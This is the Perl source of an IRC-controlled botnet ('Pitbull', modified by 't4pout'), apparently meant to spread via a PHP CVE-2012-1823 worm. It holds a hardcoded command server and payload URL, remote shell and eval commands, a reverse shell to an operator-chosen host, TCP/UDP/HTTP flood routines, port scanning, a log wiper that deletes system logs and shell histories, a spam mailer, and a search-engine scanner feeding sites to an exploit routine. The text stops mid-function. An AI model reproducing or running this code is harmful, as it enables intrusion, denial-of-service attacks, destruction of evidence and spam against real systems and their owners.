#!/usr/bin/perl

#Social Engineerer, php worm CVE-2012-1823, email bot 
# Modified by t4pout
#install required stuff using cpan - if root.
#$a = `cpan install HTTP::Request`;
#$b = `cpan install LWP::UserAgent`;
#$c = `cpan install Email::Find`;

#use HTTP::Request;
#use LWP::UserAgent;
#use Email::Find;
#use YAML;
$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';
use IO::Socket;
use Socket;
use IO::Select;


#my $finder = Email::Find->new(\&print_email);

######################
my $processo = 'php';
######################
#####################################################################
#/!\						  .:CONFIGURATION:.				  /!\#
#####################################################################
############################################
my $linas_max='8';
#-----------------						 #
# Maximum Lines for Anti Flood			 #
#############################################
my $sleep='5';
#-----------------						 #									  
#Sleep Time								#
############################################
my $cmd="http://update.joomlaupdates.in/joomlaupdate.zip";
my $updateurl="http://update.joomlaupdates.in/joomlaupdate.zip";

#-----------------						 #
#CMD that is printed in the channel		#
############################################
my $id="http://www.enricco.cl/catalogo/catalog/images/bot_site.gif";
#-----------------						 #
#ID = Response CMD						 #
############################################
my @adms=("A","root");
#-----------------						 #
#Admins of the Bot set your nickname here  #
############################################
my @canais=("#sb");
#-----------------						 #
#Put your channel here					 #
############################################
my @nickname = ("SkY|");
my $nick = $nickname[rand scalar @nickname];
#-----------------						 #
#Nickname of bot						   #
############################################
my $ircname ='RoX';
chop (my $realname = 'Pitbull');
#-----------------						 #
#IRC name and Realname					 #
############################################
$servidor='linksys.secureshellz.net' unless $servidor;
my $porta='25';
#-----------------						 #


my @dominios = ("com","net","org","info","gov", "gob","gub","xxx", "eu","mil","edu","aero","name","us","ca","mx","pa","ni","cu","pr","ve","co","pe","ec", 
                "py","cl","uy","ar","br","bo","au","nz","cz","kr","jp","th","tw","ph","cn","fi","de","es","pt","ch","se","su","it","gr","al","dk","pl","biz","int","pro","museum" 
,"coop", 
                "af","ad","ao","ai","aq","ag","an","sa","dz","ar","am","aw","at","az","bs","bh","bd","bb","be","bz","bj","bm","bt","by","ba","bw","bn","bg","bf","bi", 
                "vc","kh","cm","td","cs","cy","km","cg","cd","dj","dm","ci","cr","hr","kp","eg","sv","aw","er","sk", 
                "ee","et","ge","fi","fr","ga","gs","gh","gi","gb","uk","gd","gl","gp","gu","gt","gg","gn","gw","gq","gy","gf","ht","nl","hn","hk","hu","in","id","ir", 
                "iq","ie","is","ac","bv","cx","im","nf","ky","cc","ck","fo","hm","fk","mp","mh","pw","um","sb","sj","tc","vg","vi","wf","il","jm","je","jo","kz","ke", 
                "ki","kg","kw","lv","ls","lb","ly","lr","li","lt","lu","mo","mk","mg","my","mw","mv","ml","mt","mq","ma","mr","mu","yt","md","mc","mn","ms","mz","mm", 
                "na","nr","np","ni","ne","ng","nu","no","nc","om","pk","ps","pg","pn","pf","qa","sy","cf","la","re","rw","ro","ru","eh","kn","ws","as","sm","pm","vc", 
                "sh","lc","va","st","sn","sc","sl","sg","so","lk","za","sd","se","sr","sz","rj","tz","io","tf","tp","tg","to","tt","tn","tr","tm","tv","ug","ua","uz", 
                "vu","vn","ye","yu","cd","zm","zw","");

######################
#End of Configuration# 
#					#
######################

chdir("/");
################################################################################
########################################


#Connect
$servidor="$ARGV[0]" if $ARGV[0];
$0="$processo"."\0"x16;;
my $pid=fork;
exit if $pid;
die "Masalah fork: $!" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_cliente = IO::Select->new();
sub sendraw {
  if ($#_ == '1') {
	my $socket = $_[0];
	print $socket "$_[1]\n";
	} else {
	print $IRC_cur_socket "$_[0]\n";
  }
}

sub conectar {
  my $meunick = $_[0];
  my $servidor_con = $_[1];
  my $porta_con = $_[2];
  my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con",
  PeerPort=>$porta_con) or return(1);
  if (defined($IRC_socket)) {
	$IRC_cur_socket = $IRC_socket;
	$IRC_socket->autoflush(1);
	$sel_cliente->add($IRC_socket);
	$irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
	$irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
	$irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
	$irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
	nick("$meunick");
	sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
	sleep 1;
  }
}

my $line_temp;
while( 1 ) {
  while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
  delete($irc_servers{''}) if (defined($irc_servers{''}));
  my @ready = $sel_cliente->can_read(0);
  next unless(@ready);
  foreach $fh (@ready) {
	$IRC_cur_socket = $fh;
	$meunick = $irc_servers{$IRC_cur_socket}{'nick'};
	$nread = sysread($fh, $msg, 4096);
	if ($nread == 0) {
	  $sel_cliente->remove($fh);
	  $fh->close;
	  delete($irc_servers{$fh});
	}
	@lines = split (/\n/, $msg);
	for(my $c=0; $c<= $#lines; $c++) {

	  $line = $lines[$c];
	  $line=$line_temp.$line if ($line_temp);
	  $line_temp='';
	  $line =~ s/\r$//;
	  unless ($c == $#lines) {
		parse("$line");
		} else {
		if ($#lines == 0) {
		  parse("$line");
		  } elsif ($lines[$c] =~ /\r$/) {
		  parse("$line");
		  } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
		  parse("$line"); 
				 } else {
							 $line_temp = $line;
		}
	  }
	}
  }
}

sub parse {
  my $servarg = shift;
  if ($servarg =~ /^PING \:(.*)/) {
	sendraw("PONG :$1");
	} elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
	my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
	if ($args =~ /^\001VERSION\001$/) {
		   notice("$pn", "\001VERSION mIRC v6.17 PitBull\001");
	}
	if (grep {$_ =~ /^\Q$pn\E$/i } @adms ) {
	if ($onde eq "$meunick"){
	shell("$pn", "$args");
  }
  
#End of Connect


######################
#	  PREFIX		#
#					#
######################
# You can change the prefix if you want but the commands will be different 
# The standard prefix is !bot if you change it into !bitch for example 
# every command will be like !bitch @udpflood, !bitch @googlescan.
# So its recommended not to change this;)
######################
  
  if ($args =~ /^(\Q$meunick\E|\!pwn)\s+(.*)/ ) {
	my $natrix = $1;
	my $arg = $2;
	if ($arg =~ /^\!(.*)/) {
	  ircase("$pn","$onde","$1") unless ($natrix eq "!pwn" and $arg =~ /^\!nick/);
	  } elsif ($arg =~ /^\@(.*)/) {
	  $ondep = $onde;
	  $ondep = $pn if $onde eq $meunick;
	  bfunc("$ondep","$1");
	  } else {
	  shell("$onde", "$arg");
	}
  }
}
}
######################
#   End of PREFIX	#
#					#
######################

elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
if (lc($1) eq lc($meunick)) {
  $meunick=$4;
  $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
}
} elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
nick("$meunick".int rand(999999));
} elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
$meunick = $2;
$irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
$irc_servers{$IRC_cur_socket}{'nome'} = "$1";
foreach my $canal (@canais) {
  sendraw("JOIN $canal pwnit");
}
}
}

sub bfunc {
my $printl = $_[0];
my $funcarg = $_[1];
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
  exit;
} else {


if ($funcarg =~ /^commands/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:0Help9:.4| 11 Ð˜ possibile utilizzare i seguenti comandi :");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:0Help9:.4| 0 !bot 7@portscan 4<0ip4>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:0Help9:.4| 0 !bot 7@nmap 4<0ip4> <0beginport4> <endport4>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:0Help9:.4| 0 !bot 7@back 4<0ip4> <0Porta4>");	
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:0Help9:.4| 0 !bot cd tmp 9<-- 0 Un esempio");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:0Help9:.4| 0 !bot 7@udpflood 4<0ip4> <0Pacchetti4> <0Tempo4>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:0Help9:.4| 0 !bot 7@tcpflood 4<0ip4> <0Porta4> <0Pacchetti4> <0Tempo4>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:0Help9:.4| 0 !bot 7@httpflood 4<0Sito4> <0Tempo4>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:0Help9:.4| 0 !bot 7@linuxhelp");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:0Help9:.4| 0 !bot 7@Scan 4<0Linck4> <0Dork4>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:0Help9:.4| 0 !bot 7@system");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:0Help9:.4| 0 !bot 7@logcleaner");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:0Help9:.4| 0 !bot 7@sendmail 4<subject4> <sender4> <recipient4> <message4>");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:0Help9:.4| 0 !bot 7@milw0rm");	
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:0Help9:.4| 0 !bot 7@join 4#9channel");	
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:0Help9:.4| 0 !bot 7@part 4#9channel");
}



######################
#   End of  Help	 # 
#					#
######################

######################
#	 Commands	   # 
#					#
######################

if ($funcarg =~ /^system/) {
$uname=`uname -a`;$uptime=`uptime`;$ownd=`pwd`;$distro=`cat /etc/issue`;$id=`id`;$un=`uname -sro`;
	sendraw($IRC_cur_socket, "PRIVMSG $printl :0Info BOT : 7 Server :Hidden : 6667");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :0Uname -a	 : 7 $uname");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :0Uptime	   : 7 $uptime");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :0Own Process  : 7 $processo");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :0ID		   : 7 $id");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :0CWD	  : 7 $ownd");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :0OS		   : 7 $distro");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :0Owner		: 7 Max");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :0Channel	  : 7 #sb");
}

}

######################
#	  Portscan	  # 
#					#
######################

if ($funcarg =~ /^portscan (.*)/) {
  my $hostip="$1";
  my
  @portas=("15","19","98","20","21","22","23","25","37","39","42","43","49","53","63","69","79","80","101","106","107","109","110","111","113","115","117","119","135","137","139","143","174","194","389","389","427","443","444","445","464","488","512","513","514","520","540","546","548","565","609","631","636","694","749","750","767","774","783","808","902","988","993","994","995","1005","1025","1033","1066","1079","1080","1109","1433","1434","1512","2049","2105","2432","2583","3128","3306","4321","5000","5222","5223","5269","5555","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","7001","7741","8000","8018","8080","8200","10000","19150","27374","31310","33133","33733","55555");
  my (@aberta, %porta_banner);
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:7Port Scan9:.4|0 Cerca porte aperte  4".$1." 0 Iniziato .");
  foreach my $porta (@portas)  {
	my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto =>
	'tcp', Timeout => 4);
	if ($scansock) {
	  push (@aberta, $porta);
	  $scansock->close;
	}
  }
  
  if (@aberta) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:7Port Scan9:.4|0 Trovata la porta sulla: @aberta");
	} else {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:7Port Scan9:.4|0 Spiacente ma non ce porte aperte.");
  }
}
}
######################
#  End of  Portscan  # 
#					#
######################

######################
#		Nmap		#  
#					#
######################
   if ($funcarg =~ /^nmap\s+(.*)\s+(\d+)\s+(\d+)/){
		 my $hostip="$1";
		 my $portstart = "$2";
		 my $portend = "$3";
		 my (@abertas, %porta_banner); 
	   sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:11Nmap PortScan9:.4| 4: $1 9.:0Porta9:. 4 $2-$3");
	   foreach my $porta ($portstart..$portend){
			   my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => $portime); 
	if ($scansock) {
				 push (@abertas, $porta);
				 $scansock->close;
				 if ($xstats){
		sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:11Nmap PortScan9:.4| 0Cerca porta 4 $porta"."/Open"); 
				 }
			   }
			 }
			 if (@abertas) {
		sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:11Nmap PortScan9:.4| Completa");
			 } else {
		sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:11Nmap PortScan9:.4| No porte aperte 13");
			 }
			 }
######################
#	End of Nmap	 #  
#					#
######################
# 
# The PitBull !!!!
#
######################
#	Log Cleaner	 #  
#					#
######################
if ($funcarg =~ /^logcleaner/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:10Pulisci Log9:.4|0 Questo processo puÑ‚ essere lungo, basta aspettare"); 
	system 'rm -rf /var/log/lastlog';
	system 'rm -rf /var/log/wtmp';
	system 'rm -rf /etc/wtmp';
	system 'rm -rf /var/run/utmp';
	system 'rm -rf /etc/utmp';
	system 'rm -rf /var/log';
	system 'rm -rf /var/logs';
	system 'rm -rf /var/adm';
	system 'rm -rf /var/apache/log';
	system 'rm -rf /var/apache/logs';
	system 'rm -rf /usr/local/apache/log'; 
	system 'rm -rf /usr/local/apache/logs';
	system 'rm -rf /root/.bash_history';
	system 'rm -rf /root/.ksh_history';
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:10Pulisci Log9:.4|0 File Log bash_history Cancellati"); 
		sleep 1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|12.:4|9.:10Pulisci Log9:.4|0 Cancellazione di tutti i file della macchina");
	system 'find / -name *.bash_history -exec rm -rf {} \;';
	system 'find / -name *.bash_logout -exec rm -rf {} \;';
	system 'find / -name "log*" -exec rm -rf {} \;';
	system 'find / -name *.log -exec rm -rf {} \;';
		sleep 1;
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:10Pulisci Log9:.4|0 Fatto! Tutti i log cancellati"); 
	  }
######################
# End of Log Cleaner #  
#					#
######################
# 
# The PitBull !!!!
#
######################
#	   MAILER	   #  
#					#
######################
# For mailing use :
# !bot @sendmail <subject> <sender> <recipient> <message>
#
######################
if ($funcarg =~ /^sendmail\s+(.*)\s+(.*)\s+(.*)\s+(.*)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:14Email9:.4|0 Invio Email in corso :2 $3");
$subject = $1;
$sender = $2;
$recipient = $3; 
@corpo = $4;
$mailtype = "content-type: text/html";
$sendmail = '/usr/sbin/sendmail';
open (SENDMAIL, "| $sendmail -t");
print SENDMAIL "$mailtype\n";
print SENDMAIL "Subject: $subject\n"; 
print SENDMAIL "From: $sender\n";
print SENDMAIL "To: $recipient\n\n";
print SENDMAIL "@corpo\n\n";
close (SENDMAIL);
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:14Email9:.4|0 Email inviata con successo :4 $recipient"); 
}
######################
#   End of MAILER	#  
#					#
######################
######################
#  Join And Part	 # 
#					#
######################
		   if ($funcarg =~ /^join (.*)/) {
			  sendraw($IRC_cur_socket, "JOIN ".$1);
		   }
		   if ($funcarg =~ /^part (.*)/) {
			  sendraw($IRC_cur_socket, "PART ".$1);
		   }
		   
######################
#End of Join And Part# 
#					#
######################

######################
#	 TCPFlood	   # 
#					#
######################

if ($funcarg =~ /^tcpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:13TCP DDos9:.4|0 Attaco 4 ".$1.":".$2." 0Per 4 ".$3." 0secondi.");
  my $itime = time;
  my ($cur_time);
  $cur_time = time - $itime;
  while ($3>$cur_time){
  $cur_time = time - $itime;
  &tcpflooder("$1","$2","$3");
}
sendraw($IRC_cur_socket,"PRIVMSG $printl :4|9.:13TCP DDos9:.4| 0Attaco finito 4 ".$1.":".$2.".");
}
######################
#  End of TCPFlood   # 
#					#
######################

######################
#   Back Connect	 # 
#					#
######################
if ($funcarg =~ /^back\s+(.*)\s+(\d+)/) {
my $host = "$1";
my $porta = "$2";
my $proto = getprotobyname('tcp');
my $iaddr = inet_aton($host);
my $paddr = sockaddr_in($porta, $iaddr);
my $shell = "/bin/sh -i";
if ($^O eq "MSWin32") {
  $shell = "cmd.exe";
}
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
connect(SOCKET, $paddr) or die "connect: $!";
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
system("$shell");
close(STDIN);
close(STDOUT);
close(STDERR);
if ($estatisticas)
{
  sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:4BackConnect9:.4|0 Connetti in 4 $host:$porta");
}
}
######################
#End of  Back Connect# 
#					#
######################
if ($funcarg =~ /^Die/){
die();
}
######################
#	GOOGLE DOMAIN SCANNER/FINDER   # 
#					#
######################
if ($funcarg =~ /^Scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my %hosts;
### End of Start Message
# Starting Google
my @glist=&google($dork);
sendraw($IRC_cur_socket, "PRIVMSG $printl :scanning Google ".scalar(@glist)."");

my @flist=&msn($dork);
sendraw($IRC_cur_socket, "PRIVMSG $printl :scanning MSN ".scalar(@flist)."");
#

my @llist=&lycos($dork);
sendraw($IRC_cur_socket, "PRIVMSG $printl :scanning LYCOS ".scalar(@llist)."");

my @alist=&aol($dork);
sendraw($IRC_cur_socket, "PRIVMSG $printl :scanning AOL ".scalar(@alist)."");

push(my @tot, @glist, @flist, @llist, @alist );
my @puliti=&unici(@tot);
sendraw($IRC_cur_socket, "PRIVMSG $printl :Scan Total ".scalar(@tot)." ".scalar(@puliti)." 0su 4 $dork ");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$original = $sito;

if ($sito =~ /([^:]*:\/\/)?([^\/]*\.)*([^\/\.]+\.[^\/]+)/g) {
$sito = $3;
}
$sito =~ s/[^a-zA-Z0-9.]*//g; 


sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:14Attacking New URL: $sito");
sleep 2;
#ATTEMPT TO EXPLOIT PHP EXPLOIT#
php($sito);

###############
############## Auto sends an email to the domain "$sito" by whois'ing the domain and getting the owners email.
#############
#find_owner_email($sito);
############
###########
##########
#########     GOT ELITE?
########           by T4pout
#######
######
#####
####
###
##
#

$contatore++;
if ($contatore %25==0){ 
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:4Scan9:.4|0 Siti Controlati4 ".$contatore." 0su4 ".$uni. " 0Siti Trovati");
}
if ($contatore==$uni-1){
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:0Scan9:.4| Scan done 4 $dork");
}




}}
exit;
}}}





#End of MultiSCANNER # 
#					#
######################
# RESERVED xD

######################
#	 HTTPFlood	  # 
#					#
######################
if ($funcarg =~ /^httpflood\s+(.*)\s+(\d+)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:4HTTP DDos9:.4|0 Attaco 4 ".$1." 0 Sulla porta 80 per 4 ".$2." 0 secondi .");
my $itime = time;
my ($cur_time);
$cur_time = time - $itime;
while ($2>$cur_time){
$cur_time = time - $itime;
my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);
print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
close($socket);
}
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:4HTTP DDos9:.4|0 Attaco Finito 4 ".$1.".");
}
######################
#  End of HTTPFlood  # 
#					#
######################

######################
#	 UDPFlood	   # 
#					#
######################
if ($funcarg =~ /^udpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:0UDP DDos9:.4|0 Attaco 4 ".$1." 0 Con 4 ".$2." 0 pacchetti per KB 4 ".$3." 0 secondi.");
my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3");
$dtime = 1 if $dtime == 0;
my %bytes;
$bytes{igmp} = $2 * $pacotes{igmp};
$bytes{icmp} = $2 * $pacotes{icmp};
$bytes{o} = $2 * $pacotes{o};
$bytes{udp} = $2 * $pacotes{udp};
$bytes{tcp} = $2 * $pacotes{tcp};
sendraw($IRC_cur_socket, "PRIVMSG $printl :4|9.:0UDP DDos9:.4|0 Resultato4 ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." 0KB in4 ".$dtime." 0secondi 4 ".$1.".");
}
exit;


######################
#  End of Udpflood   # 
#					#
######################


sub ircase {
my ($kem, $printl, $case) = @_;
  if ($case =~ /^join (.*)/) {
	 j("$1");
   }
   if ($case =~ /^part (.*)/) {
	  p("$1");
   }
if ($case =~ /^rejoin\s+(.*)/) {
my $chan = $1;
if ($chan =~ /^(\d+) (.*)/) {
for (my $ca = 1; $ca <= $1; $ca++ ) {
p("$2");
j("$2");
}
}
else {
p("$chan");
j("$chan");
}
}

if ($case =~ /^op/) {
op("$printl", "$kem") if $case eq "op";
my $oarg = substr($case, 3);
op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
}

if ($case =~ /^deop/) {
deop("$printl", "$kem") if $case eq "deop";
my $oarg = substr($case, 5);
deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
}

if ($case =~ /^msg\s+(\S+) (.*)/) {
msg("$1", "$2");
}

if ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
for (my $cf = 1; $cf <= $1; $cf++) {
msg("$2", "$3");
}
}

if ($case =~ /^ctcp\s+(\S+) (.*)/) {
ctcp("$1", "$2");
}

if ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
for (my $cf = 1; $cf <= $1; $cf++) {
ctcp("$2", "$3");
}
}

if ($case =~ /^nick (.*)/) {
nick("$1");
}

if ($case =~ /^connect\s+(\S+)\s+(\S+)/) {
conectar("$2", "$1", 6667);
}

if ($case =~ /^raw (.*)/) {
sendraw("$1");
}

if ($case =~ /^eval (.*)/) {
eval "$1";
}
}


sub shell {
my $printl=$_[0];
my $comando=$_[1];
if ($comando =~ /cd (.*)/) {
chdir("$1") || msg("$printl", "No such file or directory");
return;
}

elsif ($pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) {
exit;

} else {
my @resp=`$comando 2>&1 3>&1`;
my $c=0;
foreach my $linha (@resp) {
  $c++;
  chop $linha;
  sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
  if ($c == "$linas_max") {
	$c=0;
	sleep $sleep;
  }
}
exit;
}
}
}

sub tcpflooder {
my $itime = time;
my ($cur_time);
my ($ia,$pa,$proto,$j,$l,$t);
$ia=inet_aton($_[0]);
$pa=sockaddr_in($_[1],$ia);
$ftime=$_[2];
$proto=getprotobyname('tcp');
$j=0;$l=0;
$cur_time = time - $itime;
while ($l<1000){
$cur_time = time - $itime;
last if $cur_time >= $ftime;
$t="SOCK$l";
socket($t,PF_INET,SOCK_STREAM,$proto);
connect($t,$pa)||$j--;
$j++;$l++;
}
$l=0;
while ($l<1000){
$cur_time = time - $itime;
last if $cur_time >= $ftime;
$t="SOCK$l";
shutdown($t,2);
$l++;
}
}



sub udpflooder {
my $iaddr = inet_aton($_[0]);
my $msg = 'A' x $_[1];
my $ftime = $_[2];
my $cp = 0;
my (%pacotes);
$pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
return(undef) if $cp == 4;
my $itime = time;
my ($cur_time);
while ( 1 ) {
for (my $porta = 1;
$porta <= 65000; $porta++) {
$cur_time = time - $itime;
last if $cur_time >= $ftime;
send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;
send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;
send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;
send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;


for (my $pc = 3;
$pc <= 255;$pc++) {
next if $pc == 6;
$cur_time = time - $itime;
last if $cur_time >= $ftime;
socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;
}
}
last if $cur_time >= $ftime;
}
return($cur_time, %pacotes);
}

sub ctcp {
return unless $#_ == 1;
sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}

sub msg {
return unless $#_ == 1;
sendraw("PRIVMSG $_[0] :$_[1]");
}

sub notice {
return unless $#_ == 1;
sendraw("NOTICE $_[0] :$_[1]");
}

sub op {
return unless $#_ == 1;
sendraw("MODE $_[0] +o $_[1]");
}

sub deop {
return unless $#_ == 1;
sendraw("MODE $_[0] -o $_[1]");
}

sub j {
&join(@_);
}

sub join {
return unless $#_ == 0;
sendraw("JOIN $_[0]");

}
sub p { part(@_);
}

sub part {
sendraw("PART $_[0]");
}

sub nick {
return unless $#_ == 0;
sendraw("NICK $_[0]");
}

sub quit {
sendraw("QUIT :$_[0]");
}

sub fetch(){
my $rnd=(int(rand(9999)));
my $key = $_[0];
my $n= 80;
if ($rnd<5000) { $n<<=1;}
my $s= (int(rand(10)) * $n);
{

my @str;
foreach $dom  (@dominios)
{
push (@str,"@gstring");
}
my $query="www.google.com/search?q=".key($key);
$query.=$str[(rand(scalar(@str)))];
$query.="&num=$n&start=$s&filter=0";
my @lst=();
sendraw("PRIVMSG #sb :DEBUG : ".$query."");
my $page = http_query($query);
while ($page =~  m/data-url=\"?http:\/\/([^>\"]*)\//g){
#if ($1 !~ m/*/){
push (@lst,$1);
#}
}
return (@lst);
}


sub yahoo(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=100){
my $Ya=("http://search.yahoo.com/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<span class=yschurl>(.+?)\<\/span>/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub msn(){



my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $dom = $dominios[int(rand(34))];
my $MsN=("http://www.bing.com/search?q=site%3A$dom%22".key($key)."&first=".$b."&FORM=PERE");
my $Res=query($MsN);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
#if($1 !~ //){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}#}
return @lst;
}


sub lycos(){
my $inizio=0;
my $pagine=20;
my $key=$_[0];
my $av=0;
my @lst;
while($inizio <= $pagine){
my $lycos="http://search.lycos.com/web?q=".key($key)."&pn=$av";
my $Res=query($lycos);
while ($Res=~ m/title=\"http:\/\/(.+?)\//g ){
my $k="$1";
my @grep=links($k);
push(@lst,@grep);
}
$inizio++;
$av++;
}
return @lst;
}

#####
sub aol(){
my @lst;
my $key = $_[0];
for($b=1;$b<=100;$b++){
my $AoL=("http://search.aol.com/aol/search?v_t=na&q=".key($key)."&page=".$b."&nt=null&ie=UTF-8");
my $Res=query($AoL);
while($Res =~ m/href=\"http:\/\/(.+?)\"/g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}
#####
sub ask(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=10)
{
my $Ask=("http://it.ask.com/web?q=".key($key)."&o=312&l=dir&qsrc=0&page=".$i."&dm=all");
my $Res=query($Ask);
#while($Res=~m/<a id=\"(.*?)\" class=\"(.*?)\" href=\"(.+?)\onmousedown/g){
#my $k=$3;
#$k=~s/[\"\ ]//g;
#my @grep=links($k);
#push(@lst,@grep);
#}
}
return @lst;
}
#####
sub alltheweb()
{
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=100)
{
my $all=("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$i);
my $Res=query($all);
while($Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub google(){
my @lst;
my $key = $_[0];
for($b=0;$b<=100;$b+=100){
my $Go=("http://www.google.com/search?q=".key($key)."&num=100&filter=0&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
